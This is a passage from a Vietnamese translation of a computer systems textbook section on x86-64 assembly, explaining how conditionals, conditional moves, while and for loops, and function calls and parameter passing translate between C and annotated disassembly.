0x4005b0 &lt;+26&gt;: mov -0x14(%rbp),%eax          # copy x to %eax
0x4005b9 &lt;+35&gt;: pop %rbp                      # restore %rbp (clean up stack)
0x4005ba &lt;+36&gt;: retq                          # exit function (return %eax)
</code></pre>
<p>Chuyển ngược đoạn assembly này về code C sẽ cho ra:</p>
<h2 id="bảng-1"><a class="header" href="#bảng-1">Bảng 1:</a></h2>
<table>
  <thead>
    <tr>
      <th>Dạng goto</th>
      <th>Mã C đã dịch</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
      <pre><code>int getSmallest(int x, int y) {
    int smallest;
    if (x <= y) {
        goto assign_x;
    }
    smallest = y;
    goto done;
<p>assign_x:
smallest = x;</p>
<p>done:
return smallest;
}
</code></pre>
</td>
<td>
<pre><code>int getSmallest(int x, int y) {
int smallest;
if (x &lt;= y) {
smallest = x;
} else {
smallest = y;
}
return smallest;
}
</code></pre>
</td>
</tr></p>
</tbody>
</table>
<p><strong>Bảng 1.</strong> Dịch <code>getSmallest()</code> sang dạng C dùng <code>goto</code> và dạng C thông thường.</p>
<p>Trong <strong>Bảng 1</strong>, biến <code>smallest</code> tương ứng với thanh ghi <code>%eax</code>. Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, code sẽ thực thi câu lệnh <code>smallest = x</code>, câu lệnh này gắn với nhãn <code>goto</code> là <code>assign_x</code> trong dạng <code>goto</code> của hàm. Ngược lại, câu lệnh <code>smallest = y</code> sẽ được thực thi. Nhãn <code>goto</code> <code>done</code> được dùng để chỉ ra rằng giá trị trong <code>smallest</code> sẽ được trả về.</p>
<p>Hãy lưu ý rằng bản dịch C ở trên của đoạn assembly có một chút khác biệt so với hàm <code>getSmallest</code> ban đầu. Những khác biệt này không quan trọng; khi xem xét kỹ cả hai hàm, ta thấy chúng tương đương về mặt logic. Tuy nhiên, compiler trước tiên sẽ chuyển bất kỳ câu lệnh <code>if</code> nào thành dạng <code>goto</code> tương đương, dẫn đến một phiên bản hơi khác nhưng vẫn tương đương. <strong>Bảng 2</strong> cho thấy dạng chuẩn của câu lệnh <code>if</code> và dạng <code>goto</code> tương đương:</p>
<table>
  <thead>
    <tr>
      <th>C if statement</th>
      <th>Dạng goto tương đương của compiler</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
      <pre><code>if (condition) {
    then_statement;
} else {
    else_statement;
}
</code></pre>
      </td>
      <td>
      <pre><code>if (!condition) {
    goto else;
}
    then_statement;
    goto done;
else:
    else_statement;
done:
</code></pre>
      </td>
    </tr>
  </tbody>
</table>
<p><strong>Bảng 2.</strong> Dạng chuẩn của câu lệnh <code>if</code> và dạng <code>goto</code> tương đương.</p>
<p>Khi dịch code sang assembly, compiler sẽ tạo một lệnh nhảy (jump) khi điều kiện <strong>đúng</strong>. Điều này trái ngược với cấu trúc của câu lệnh <code>if</code>, nơi “nhảy” (tới <code>else</code>) xảy ra khi điều kiện <strong>không</strong> đúng. Dạng <code>goto</code> thể hiện rõ sự khác biệt về logic này.</p>
<p>Xét bản dịch <code>goto</code> ban đầu của hàm <code>getSmallest</code>, ta thấy rằng:</p>
<ul>
<li><code>x &lt;= y</code> tương ứng với <code>!condition</code>.</li>
<li><code>smallest = x</code> là <code>else_statement</code>.</li>
<li>Dòng <code>smallest = y</code> là <code>then_statement</code>.</li>
<li>Dòng cuối cùng của hàm là <code>return smallest</code>.</li>
</ul>
<p>Viết lại phiên bản gốc của hàm với các chú thích ở trên sẽ cho:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &gt; y) {     // !(x &lt;= y)
        smallest = y; // then_statement
    }
    else {
        smallest = x; // else_statement
    }
    return smallest;
}
</code></pre>
<p>Phiên bản này giống hệt với hàm <code>getSmallest</code> ban đầu. Hãy nhớ rằng một hàm được viết theo nhiều cách khác nhau ở mức code C vẫn có thể được dịch ra cùng một tập lệnh assembly.</p>
<h4 id="các-lệnh-cmov"><a class="header" href="#các-lệnh-cmov">Các lệnh cmov</a></h4>
<p>Nhóm lệnh điều kiện cuối cùng mà chúng ta đề cập là <strong>conditional move</strong> (<code>cmov</code>). Các lệnh <code>cmp</code>, <code>test</code> và <code>jmp</code> thực hiện <em>conditional transfer of control</em> (chuyển điều khiển có điều kiện) trong một chương trình. Nói cách khác, luồng thực thi của chương trình sẽ rẽ nhánh theo nhiều hướng khác nhau. Điều này có thể gây bất lợi cho việc tối ưu hóa code, vì các nhánh này thường tốn kém về hiệu năng.</p>
<p>Ngược lại, lệnh <code>cmov</code> thực hiện <em>conditional transfer of data</em> (chuyển dữ liệu có điều kiện). Nói cách khác, cả <code>then_statement</code> và <code>else_statement</code> của cấu trúc điều kiện đều được thực thi, và dữ liệu sẽ được đặt vào thanh ghi thích hợp dựa trên kết quả của điều kiện.</p>
<p>Việc sử dụng <strong>biểu thức ba ngôi</strong> (ternary expression) trong C thường khiến compiler sinh ra lệnh <code>cmov</code> thay vì các lệnh nhảy. Với câu lệnh if-then-else thông thường, biểu thức ba ngôi có dạng:</p>
<pre><code class="language-c">result = (condition) ? then_statement : else_statement;
</code></pre>
<p>Hãy sử dụng dạng này để viết lại hàm <code>getSmallest</code> dưới dạng biểu thức ba ngôi. Lưu ý rằng phiên bản mới này hoạt động hoàn toàn giống với hàm <code>getSmallest</code> ban đầu:</p>
<pre><code class="language-c">int getSmallest_cmov(int x, int y) {
    return x &gt; y ? y : x;
}
</code></pre>
<p>Mặc dù thay đổi này có vẻ không lớn, nhưng hãy xem code assembly được tạo ra. Hãy nhớ rằng tham số thứ nhất và thứ hai (<code>x</code> và <code>y</code>) lần lượt được lưu trong các thanh ghi <code>%edi</code> và <code>%esi</code>:</p>
<pre><code>0x4005d7 &lt;+0&gt;:   push   %rbp             #save %rbp
0x4005d8 &lt;+1&gt;:   mov    %rsp,%rbp        #update %rbp
0x4005db &lt;+4&gt;:   mov    %edi,-0x4(%rbp)  #copy x to %rbp-0x4
0x4005de &lt;+7&gt;:   mov    %esi,-0x8(%rbp)  #copy y to %rbp-0x8
0x4005e1 &lt;+10&gt;:  mov    -0x8(%rbp),%eax  #copy y to %eax
0x4005e4 &lt;+13&gt;:  cmp    %eax,-0x4(%rbp)  #compare x and y
0x4005e7 &lt;+16&gt;:  cmovle -0x4(%rbp),%eax  #if (x &lt;=y) copy x to %eax
0x4005eb &lt;+20&gt;:  pop    %rbp             #restore %rbp
0x4005ec &lt;+21&gt;:  retq                    #return %eax
</code></pre>
<p>Đoạn code assembly này <strong>không có lệnh nhảy</strong>. Sau khi so sánh <code>x</code> và <code>y</code>, <code>x</code> sẽ được chuyển vào thanh ghi trả về chỉ khi <code>x</code> nhỏ hơn hoặc bằng <code>y</code>. Giống như các lệnh nhảy, hậu tố của lệnh <code>cmov</code> cho biết điều kiện mà việc chuyển dữ liệu có điều kiện sẽ xảy ra. <strong>Bảng 3</strong> liệt kê tập hợp các lệnh conditional move.</p>
<div class="table-wrapper"><table><thead><tr><th>Signed</th><th>Unsigned</th><th>Mô tả</th></tr></thead><tbody>
<tr><td><code>cmove</code> (<code>cmovz</code>)</td><td></td><td>move if equal (==)</td></tr>
<tr><td><code>cmovne</code> (<code>cmovnz</code>)</td><td></td><td>move if not equal (!=)</td></tr>
<tr><td><code>cmovs</code></td><td></td><td>move if negative</td></tr>
<tr><td><code>cmovns</code></td><td></td><td>move if non-negative</td></tr>
<tr><td><code>cmovg</code> (<code>cmovnle</code>)</td><td><code>cmova</code> (<code>cmovnbe</code>)</td><td>move if greater (&gt;)</td></tr>
<tr><td><code>cmovge</code> (<code>cmovnl</code>)</td><td><code>cmovae</code> (<code>cmovnb</code>)</td><td>move if greater than or equal (&gt;=)</td></tr>
<tr><td><code>cmovl</code> (<code>cmovnge</code>)</td><td><code>cmovb</code> (<code>cmovnae</code>)</td><td>move if less (&lt;)</td></tr>
<tr><td><code>cmovle</code> (<code>cmovng</code>)</td><td><code>cmovbe</code> (<code>cmovna</code>)</td><td>move if less than or equal (&lt;=)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh cmov.</p>
<p>Trong trường hợp của hàm <code>getSmallest</code> ban đầu, <strong>trình tối ưu hóa nội bộ</strong> của compiler (xem Chương 12) sẽ thay thế các lệnh nhảy bằng một lệnh <code>cmov</code> nếu bật tối ưu hóa cấp độ 1 (tức <code>-O1</code>):</p>
<pre><code>#compiled with: gcc -O1 -o getSmallest getSmallest.c
&lt;getSmallest&gt;:
    0x400546 &lt;+0&gt;: cmp    %esi,%edi      #compare x and y
    0x400548 &lt;+2&gt;: mov    %esi,%eax      #copy y to %eax
    0x40054a &lt;+4&gt;: cmovle %edi,%eax      #if (x&lt;=y) copy x to %eax
    0x40054d &lt;+7&gt;: retq                  #return %eax
</code></pre>
<p>Nói chung, <strong>compiler</strong> rất thận trọng khi tối ưu hóa các lệnh nhảy (<strong>jump instructions</strong>) thành các lệnh <code>cmov</code>, đặc biệt trong các trường hợp có liên quan đến <strong>side effects</strong> (tác dụng phụ) và giá trị con trỏ (<strong>pointer values</strong>). <strong>Bảng 4</strong> cho thấy hai cách viết tương đương của một hàm <code>incrementX</code>:</p>
<p>C code</p>
<pre><code>int incrementX(int *x) {
    if (x != NULL) { //if x is not NULL
        return (*x)++; //increment x
    }
    else { //if x is NULL
        return 1; //return 1
    }
}
</code></pre>
<p>C ternary form:</p>
<pre><code>int incrementX2(int *x){
    return x ? (*x)++ : 1;
}
</code></pre>
<p><strong>Bảng 4.</strong> Hai hàm cố gắng tăng giá trị của số nguyên <code>x</code>.</p>
<p>Mỗi hàm nhận vào một con trỏ tới một số nguyên và kiểm tra xem nó có phải <code>NULL</code> hay không. Nếu <code>x</code> không phải <code>NULL</code>, hàm sẽ tăng giá trị được giải tham chiếu của <code>x</code> và trả về giá trị đó. Ngược lại, hàm sẽ trả về giá trị 1.</p>
<p>Thoạt nhìn, có thể bạn sẽ nghĩ rằng <code>incrementX2</code> sử dụng lệnh <code>cmov</code> vì nó dùng <strong>biểu thức ba ngôi</strong> (ternary expression). Tuy nhiên, cả hai hàm đều sinh ra <strong>chính xác cùng một code assembly</strong>.</p>
<pre><code>0x4005ed &lt;+0&gt;:   push   %rbp
0x4005ee &lt;+1&gt;:   mov    %rsp,%rbp
0x4005f1 &lt;+4&gt;:   mov    %rdi,-0x8(%rbp)
0x4005f5 &lt;+8&gt;:   cmpq   $0x0,-0x8(%rbp)
0x4005fa &lt;+13&gt;:  je     0x40060d &lt;incrementX+32&gt;
0x4005fc &lt;+15&gt;:  mov    -0x8(%rbp),%rax
0x400600 &lt;+19&gt;:  mov    (%rax),%eax
0x400602 &lt;+21&gt;:  lea    0x1(%rax),%ecx
0x400605 &lt;+24&gt;:  mov    -0x8(%rbp),%rdx
0x400609 &lt;+28&gt;:  mov    %ecx,(%rdx)
0x40060b &lt;+30&gt;:  jmp    0x400612 &lt;incrementX+37&gt;
0x40060d &lt;+32&gt;:  mov    $0x1,%eax
0x400612 &lt;+37&gt;:  pop    %rbp
0x400613 &lt;+38&gt;:  retq
</code></pre>
<p>Hãy nhớ rằng lệnh <code>cmov</code> <em>thực thi cả hai nhánh của điều kiện</em>. Nói cách khác, <code>x</code> sẽ luôn bị giải tham chiếu (<strong>dereference</strong>) bất kể điều kiện là gì. Xét trường hợp <code>x</code> là một con trỏ null: việc giải tham chiếu một con trỏ null sẽ dẫn đến <strong>null pointer exception</strong> trong code, gây ra lỗi <strong>segmentation fault</strong>. Để loại bỏ hoàn toàn khả năng này, compiler chọn cách an toàn và sử dụng các lệnh nhảy.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="743-vòng-lặp-trong-assembly"><a class="header" href="#743-vòng-lặp-trong-assembly">7.4.3. Vòng lặp trong Assembly</a></h3>
<p>Tương tự như câu lệnh <code>if</code>, các vòng lặp trong assembly cũng được triển khai bằng các lệnh nhảy (<strong>jump instructions</strong>). Tuy nhiên, vòng lặp cho phép các lệnh được <em>thực thi lại</em> dựa trên kết quả của một điều kiện được đánh giá.</p>
<p>Hàm <code>sumUp</code> trong ví dụ dưới đây tính tổng tất cả các số nguyên dương từ 1 đến một số nguyên do người dùng xác định. Đoạn code này được viết <strong>không tối ưu</strong> để minh họa vòng lặp <code>while</code> trong C.</p>
<pre><code class="language-c">int sumUp(int n) {
    //initialize total and i
    int total = 0;
    int i = 1;

    while (i &lt;= n) {  //while i is less than or equal to n
        total += i;   //add i to total
        i++;          //increment i by 1
    }
    return total;
}
</code></pre>
<p>Biên dịch đoạn code này và dùng GDB để disassemble sẽ cho ra code assembly sau:</p>
<pre><code>Dump of assembler code for function sumUp:
0x400526 &lt;+0&gt;:   push   %rbp
0x400527 &lt;+1&gt;:   mov    %rsp,%rbp
0x40052a &lt;+4&gt;:   mov    %edi,-0x14(%rbp)
0x40052d &lt;+7&gt;:   mov    $0x0,-0x8(%rbp)
0x400534 &lt;+14&gt;:  mov    $0x1,-0x4(%rbp)
0x40053b &lt;+21&gt;:  jmp    0x400547 &lt;sumUp+33&gt;
0x40053d &lt;+23&gt;:  mov    -0x4(%rbp),%eax
0x400540 &lt;+26&gt;:  add    %eax,-0x8(%rbp)
0x400543 &lt;+29&gt;:  add    $0x1,-0x4(%rbp)
0x400547 &lt;+33&gt;:  mov    -0x4(%rbp),%eax
0x40054a &lt;+36&gt;:  cmp    -0x14(%rbp),%eax
0x40054d &lt;+39&gt;:  jle    0x40053d &lt;sumUp+23&gt;
0x40054f &lt;+41&gt;:  mov    -0x8(%rbp),%eax
0x400552 &lt;+44&gt;:  pop    %rbp
0x400553 &lt;+45&gt;:  retq
</code></pre>
<p>Một lần nữa, chúng ta sẽ không vẽ stack một cách tường minh trong ví dụ này. Tuy nhiên, bạn đọc nên tự vẽ stack để luyện tập.</p>
<h4 id="năm-lệnh-đầu-tiên"><a class="header" href="#năm-lệnh-đầu-tiên">Năm lệnh đầu tiên</a></h4>
<p>Năm lệnh đầu tiên của hàm này thiết lập stack để thực thi hàm và khởi tạo các giá trị tạm thời:</p>
<pre><code>0x400526 &lt;+0&gt;:  push %rbp              # save %rbp onto the stack
0x400527 &lt;+1&gt;:  mov  %rsp,%rbp         # update the value of %rbp (new frame)
0x40052a &lt;+4&gt;:  mov  %edi,-0x14(%rbp)  # copy n to %rbp-0x14
0x40052d &lt;+7&gt;:  mov  $0x0,-0x8(%rbp)   # copy 0 to %rbp-0x8 (total)
0x400534 &lt;+14&gt;: mov  $0x1,-0x4(%rbp)   # copy 1 to %rbp-0x4 (i)
</code></pre>
<p>Hãy nhớ rằng các vị trí trên stack lưu trữ <em>các biến tạm thời</em> trong một hàm. Để đơn giản, ta sẽ gọi vị trí <code>%rbp-0x8</code> là <code>total</code> và <code>%rbp-0x4</code> là <code>i</code>. Tham số đầu vào <code>n</code> của <code>sumUp</code> được lưu tại <code>%rbp-0x14</code>. Mặc dù các biến tạm được đặt trên stack, lưu ý rằng stack pointer không thay đổi sau khi thực thi lệnh đầu tiên (<code>push %rbp</code>).</p>
<h4 id="trái-tim-của-vòng-lặp"><a class="header" href="#trái-tim-của-vòng-lặp">Trái tim của vòng lặp</a></h4>
<p>Bảy lệnh tiếp theo trong hàm <code>sumUp</code> là phần lõi của vòng lặp:</p>
<pre><code>0x40053b &lt;+21&gt;:  jmp    0x400547 &lt;sumUp+33&gt;  # goto &lt;sumUp+33&gt;
0x40053d &lt;+23&gt;:  mov    -0x4(%rbp),%eax      # copy i to %eax
0x400540 &lt;+26&gt;:  add    %eax,-0x8(%rbp)      # add i to total (total += i)
0x400543 &lt;+29&gt;:  add    $0x1,-0x4(%rbp)      # add 1 to i (i += 1)
0x400547 &lt;+33&gt;:  mov    -0x4(%rbp),%eax      # copy i to %eax
0x40054a &lt;+36&gt;:  cmp    -0x14(%rbp),%eax     # compare i to n
0x40054d &lt;+39&gt;:  jle    0x40053d &lt;sumUp+23&gt;  # if (i &lt;= n) goto &lt;sumUp+23&gt;
</code></pre>
<ul>
<li>Lệnh đầu tiên là một <strong>jump</strong> trực tiếp tới <code>&lt;sumUp+33&gt;</code>, đặt <code>%rip</code> thành <code>0x400547</code>.</li>
<li>Lệnh tiếp theo thực thi là <code>mov -0x4(%rbp),%eax</code>, đưa giá trị của <code>i</code> vào <code>%eax</code>. <code>%rip</code> được cập nhật thành <code>0x40054a</code>.</li>
<li>Lệnh <code>cmp</code> tại <code>&lt;sumUp+36&gt;</code> so sánh <code>i</code> với <code>n</code> và thiết lập các <strong>condition code register</strong> phù hợp. <code>%rip</code> được đặt thành <code>0x40054d</code>.</li>
</ul>
<p>Sau đó, lệnh <code>jle</code> được thực thi. Các lệnh tiếp theo phụ thuộc vào việc nhánh có được thực hiện hay không.</p>
<p><strong>Trường hợp nhánh được thực hiện</strong> (<code>i &lt;= n</code> là đúng): <code>%rip</code> được đặt thành <code>0x40053d</code> và chương trình nhảy tới <code>&lt;sumUp+23&gt;</code>. Các lệnh sau sẽ chạy tuần tự:</p>
<ul>
<li><code>mov</code> tại <code>&lt;sumUp+23&gt;</code> sao chép <code>i</code> vào <code>%eax</code>.</li>
<li><code>add %eax,-0x8(%rbp)</code> cộng <code>i</code> vào <code>total</code> (<code>total += i</code>).</li>
<li><code>add</code> tại <code>&lt;sumUp+29&gt;</code> cộng 1 vào <code>i</code> (<code>i += 1</code>).</li>
<li><code>mov</code> tại <code>&lt;sumUp+33&gt;</code> sao chép giá trị mới của <code>i</code> vào <code>%eax</code>.</li>
<li><code>cmp</code> so sánh <code>i</code> với <code>n</code> và thiết lập các cờ điều kiện.</li>
<li><code>jle</code> thực thi. Nếu <code>i &lt;= n</code>, chương trình lại nhảy về <code>&lt;sumUp+23&gt;</code> và vòng lặp (từ <code>&lt;sumUp+23&gt;</code> đến <code>&lt;sumUp+39&gt;</code>) lặp lại.</li>
</ul>
<p><strong>Trường hợp nhánh không được thực hiện</strong> (<code>i</code> không nhỏ hơn hoặc bằng <code>n</code>): các lệnh sau sẽ chạy:</p>
<pre><code>0x40054f &lt;+41&gt;:  mov    -0x8(%rbp),%eax     # copy total to %eax
0x400552 &lt;+44&gt;:  pop    %rbp                # restore rbp
0x400553 &lt;+45&gt;:  retq                       # return (total)
</code></pre>
<p>Các lệnh này sao chép <code>total</code> vào <code>%eax</code>, khôi phục <code>%rbp</code> về giá trị ban đầu và thoát khỏi hàm. Do đó, hàm trả về <code>total</code> khi kết thúc.</p>
<p><strong>Bảng 1</strong> dưới đây sẽ trình bày dạng assembly và dạng C dùng <code>goto</code> của hàm <code>sumUp</code>.</p>
<p><strong>Assembly:</strong></p>
<pre><code class="language-assembly">&lt;sumUp&gt;:
&lt;+0&gt;:  push %rbp
&lt;+1&gt;:  mov %rsp,%rbp
&lt;+4&gt;:  mov %edi,-0x14(%rbp)
&lt;+7&gt;:  mov $0x0,-0x8(%rbp)
&lt;+14&gt;: mov $0x1,-0x4(%rbp)
&lt;+21&gt;: jmp 0x400547 &lt;sumUp+33&gt;
&lt;+23&gt;: mov -0x4(%rbp),%eax
&lt;+26&gt;: add %eax,-0x8(%rbp)
&lt;+29&gt;: add $0x1,-0x4(%rbp)
&lt;+33&gt;: mov -0x4(%rbp),%eax
&lt;+36&gt;: cmp -0x14(%rbp),%eax
&lt;+39&gt;: jle 0x40053d &lt;sumUp+23&gt;
&lt;+41&gt;: mov -0x8(%rbp),%eax
&lt;+44&gt;: pop %rbp
&lt;+45&gt;: retq
</code></pre>
<p><strong>Dạng C dùng goto:</strong></p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    goto start;
body:
    total += i;
    i += 1;
start:
    if (i &lt;= n) {
        goto body;
    }
    return total;
}
</code></pre>
<p><em>Bảng 1. Dịch hàm <code>sumUp</code> sang dạng C dùng <code>goto</code>.</em></p>
<p>Đoạn code trên cũng tương đương với đoạn C sau, không dùng câu lệnh <code>goto</code>:</p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    while (i &lt;= n) {
        total += i;
        i += 1;
    }
    return total;
}
</code></pre>
<h4 id="vòng-lặp-for-trong-assembly"><a class="header" href="#vòng-lặp-for-trong-assembly">Vòng lặp for trong Assembly</a></h4>
<p>Vòng lặp chính trong hàm <code>sumUp</code> cũng có thể được viết dưới dạng vòng lặp <code>for</code>:</p>
<pre><code class="language-c">int sumUp2(int n) {
    int total = 0;             // khởi tạo total = 0
    int i;
    for (i = 1; i &lt;= n; i++) { // khởi tạo i = 1, tăng i thêm 1 khi i &lt;= n
        total += i;            // cộng i vào total
    }
    return total;
}
</code></pre>
<p>Phiên bản này tạo ra code assembly <strong>giống hệt</strong> với ví dụ vòng lặp <code>while</code>. Dưới đây là code assembly và chú thích từng dòng:</p>
<pre><code class="language-assembly">Dump of assembler code for function sumUp2:
0x400554 &lt;+0&gt;:   push   %rbp                   # lưu %rbp
0x400555 &lt;+1&gt;:   mov    %rsp,%rbp              # cập nhật %rbp (stack frame mới)
0x400558 &lt;+4&gt;:   mov    %edi,-0x14(%rbp)       # copy %edi vào %rbp-0x14 (n)
0x40055b &lt;+7&gt;:   movl   $0x0,-0x8(%rbp)        # copy 0 vào %rbp-0x8 (total)
0x400562 &lt;+14&gt;:  movl   $0x1,-0x4(%rbp)        # copy 1 vào %rbp-0x4 (i)
0x400569 &lt;+21&gt;:  jmp    0x400575 &lt;sumUp2+33&gt;   # goto &lt;sumUp2+33&gt;
0x40056b &lt;+23&gt;:  mov    -0x4(%rbp),%eax        # copy i vào %eax [loop]
0x40056e &lt;+26&gt;:  add    %eax,-0x8(%rbp)        # cộng i vào total (total += i)
0x400571 &lt;+29&gt;:  addl   $0x1,-0x4(%rbp)        # cộng 1 vào i (i++)
0x400575 &lt;+33&gt;:  mov    -0x4(%rbp),%eax        # copy i vào %eax [start]
0x400578 &lt;+36&gt;:  cmp    -0x14(%rbp),%eax       # so sánh i với n
0x40057b &lt;+39&gt;:  jle    0x40056b &lt;sumUp2+23&gt;   # nếu (i &lt;= n) goto loop
0x40057d &lt;+41&gt;:  mov    -0x8(%rbp),%eax        # copy total vào %eax
0x400580 &lt;+44&gt;:  pop    %rbp                   # chuẩn bị thoát hàm
0x400581 &lt;+45&gt;:  retq                          # trả về total
</code></pre>
<p>Để hiểu vì sao phiên bản vòng lặp <code>for</code> này tạo ra code assembly giống hệt với phiên bản vòng lặp <code>while</code>, hãy nhớ rằng vòng lặp <code>for</code> có dạng:</p>
<pre><code class="language-c">for (&lt;khởi tạo&gt;; &lt;biểu thức điều kiện&gt;; &lt;bước lặp&gt;) {
    &lt;thân vòng lặp&gt;
}
</code></pre>
<p>và tương đương với dạng vòng lặp <code>while</code> sau:</p>
<pre><code class="language-c">&lt;khởi tạo&gt;
while (&lt;biểu thức điều kiện&gt;) {
    &lt;thân vòng lặp&gt;
    &lt;bước lặp&gt;
}
</code></pre>
<p>Vì <a href="C7-x86_64/../C1-C_intro/conditionals.html#_for_loops">mọi vòng lặp <code>for</code> đều có thể được biểu diễn bằng vòng lặp <code>while</code></a>, nên hai chương trình C dưới đây là các cách viết tương đương cho đoạn assembly trên:</p>
<p><strong>For loop:</strong></p>
<pre><code class="language-c">int sumUp2(int n) {
    int total = 0;
    int i = 1;
    for (i; i &lt;= n; i++) {
        total += i;
    }
    return total;
}
</code></pre>
<p><strong>While loop:</strong></p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    while (i &lt;= n) {
        total += i;
        i += 1;
    }
    return total;
}
</code></pre>
<p><em>Bảng 2. Các cách viết tương đương của hàm <code>sumUp</code>.</em></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="75-functions-in-assembly"><a class="header" href="#75-functions-in-assembly">7.5. Functions in Assembly</a></h2>
<p>Trong phần trước, chúng ta đã lần theo các hàm đơn giản trong assembly.<br />
Trong phần này, chúng ta sẽ thảo luận về sự tương tác giữa nhiều hàm trong assembly trong bối cảnh của một chương trình lớn hơn. Chúng ta cũng sẽ giới thiệu một số lệnh mới liên quan đến việc quản lý hàm.</p>
<p>Hãy bắt đầu bằng việc ôn lại cách <strong>call stack</strong> được quản lý. Hãy nhớ rằng <code>%rsp</code> là <strong>stack pointer</strong> và luôn trỏ tới đỉnh của stack. Thanh ghi <code>%rbp</code> đại diện cho <strong>base pointer</strong> (còn gọi là <strong>frame pointer</strong>) và trỏ tới đáy của <strong>stack frame</strong> hiện tại. <strong>Stack frame</strong> (còn gọi là <strong>activation frame</strong> hoặc <strong>activation record</strong>) là phần của stack được cấp phát cho một lần gọi hàm. Hàm đang thực thi luôn nằm ở đỉnh stack, và stack frame của nó được gọi là <strong>active frame</strong>. Active frame được giới hạn bởi stack pointer (ở đỉnh stack) và frame pointer (ở đáy frame). <strong>Activation record</strong> thường chứa các biến cục bộ của hàm.</p>
<p>Hình 1 minh họa các stack frame của <code>main</code> và một hàm mà nó gọi tên là <code>fname</code>. Chúng ta sẽ gọi hàm <code>main</code> là hàm <em>caller</em> và <code>fname</code> là hàm <em>callee</em>.</p>
<p><img src="C7-x86_64/_images/stackFrame.png" alt="an illustration of stack frames" /></p>
<p><strong>Hình 1.</strong> Quản lý stack frame</p>
<p>Trong Hình 1, active frame hiện tại thuộc về hàm callee (<code>fname</code>). Vùng nhớ giữa stack pointer và frame pointer được dùng cho các biến cục bộ. Stack pointer thay đổi khi các giá trị cục bộ được <strong>push</strong> và <strong>pop</strong> khỏi stack. Ngược lại, frame pointer hầu như không thay đổi, luôn trỏ tới phần bắt đầu (đáy) của stack frame hiện tại. Vì vậy, các compiler như GCC thường tham chiếu các giá trị trên stack tương đối so với frame pointer. Trong Hình 1, active frame được giới hạn phía dưới bởi base pointer của <code>fname</code>, là địa chỉ stack 0x418. Giá trị lưu tại địa chỉ 0x418 là giá trị <code>%rbp</code> đã “lưu” (0x42c), bản thân nó là một địa chỉ cho biết đáy của activation frame của hàm <code>main</code>. Đỉnh của activation frame của <code>main</code> được giới hạn bởi <strong>return address</strong>, cho biết vị trí trong hàm <code>main</code> mà chương trình sẽ tiếp tục thực thi khi hàm callee <code>fname</code> kết thúc.</p>
<blockquote>
<p><strong>Return address</strong> trỏ tới bộ nhớ của code segment, không phải stack memory.<br />
Hãy nhớ rằng vùng call stack (stack memory) của một chương trình khác với vùng code (code segment memory). Trong khi <code>%rbp</code> và <code>%rsp</code> trỏ tới địa chỉ trong stack memory, <code>%rip</code> trỏ tới một địa chỉ trong <em>code segment memory</em>. Nói cách khác, return address là một địa chỉ trong code segment memory, không phải stack memory:</p>
<p><img src="C7-x86_64/_images/memparts.png" alt="The parts of a program's address space." /><br />
<em>Hình 2. Các phần của không gian địa chỉ của một chương trình</em></p>
</blockquote>
<p><strong>Bảng 1.</strong> Một số lệnh quản lý hàm thông dụng</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>leaveq</code></td><td>Chuẩn bị stack để thoát khỏi hàm. Tương đương với:<br><code>mov %rbp, %rsp</code><br><code>pop %rbp</code></td></tr>
<tr><td><code>callq addr &lt;fname&gt;</code></td><td>Chuyển active frame sang hàm callee. Tương đương với:<br><code>push %rip</code><br><code>mov addr, %rip</code></td></tr>
<tr><td><code>retq</code></td><td>Khôi phục active frame về hàm caller. Tương đương với:<br><code>pop %rip</code></td></tr>
</tbody></table>
</div>
<p>Ví dụ, lệnh <code>leaveq</code> là một dạng viết tắt mà compiler dùng để khôi phục stack pointer và frame pointer khi chuẩn bị thoát khỏi hàm. Khi hàm callee kết thúc, <code>leaveq</code> đảm bảo frame pointer được <strong>khôi phục</strong> về giá trị trước đó.</p>
<p>Các lệnh <code>callq</code> và <code>retq</code> đóng vai trò quan trọng trong quá trình một hàm gọi hàm khác. Cả hai lệnh này đều thay đổi <strong>instruction pointer</strong> (<code>%rip</code>). Khi hàm caller thực thi lệnh <code>callq</code>, giá trị hiện tại của <code>%rip</code> sẽ được lưu trên stack để làm <strong>return address</strong> — tức địa chỉ trong chương trình mà caller sẽ tiếp tục thực thi khi callee kết thúc. Lệnh <code>callq</code> cũng thay thế giá trị <code>%rip</code> bằng địa chỉ của hàm callee.</p>
<p>Lệnh <code>retq</code> khôi phục giá trị <code>%rip</code> từ giá trị đã lưu trên stack, đảm bảo chương trình tiếp tục thực thi tại địa chỉ được chỉ định trong hàm caller. Bất kỳ giá trị trả về nào của callee sẽ được lưu trong <code>%rax</code> hoặc một trong các <strong>component register</strong> của nó (ví dụ <code>%eax</code>). Lệnh <code>retq</code> thường là lệnh cuối cùng được thực thi trong bất kỳ hàm nào.</p>
<h3 id="751-function-parameters"><a class="header" href="#751-function-parameters">7.5.1. Function Parameters</a></h3>
<p>Không giống IA32, các tham số của hàm trong x86-64 thường được nạp sẵn vào các thanh ghi trước khi gọi hàm. <strong>Bảng 2</strong> liệt kê các tham số của hàm và thanh ghi (nếu có) mà chúng được nạp vào trước khi gọi hàm.</p>
<p><strong>Bảng 2.</strong> Vị trí lưu trữ tham số hàm</p>
<div class="table-wrapper"><table><thead><tr><th>Parameter</th><th>Location</th></tr></thead><tbody>
<tr><td>Parameter 1</td><td>%rdi</td></tr>
<tr><td>Parameter 2</td><td>%rsi</td></tr>
<tr><td>Parameter 3</td><td>%rdx</td></tr>
<tr><td>Parameter 4</td><td>%rcx</td></tr>
<tr><td>Parameter 5</td><td>%r8</td></tr>
<tr><td>Parameter 6</td><td>%r9</td></tr>
<tr><td>Parameter 7+</td><td>trên call stack</td></tr>
</tbody></table>
</div>
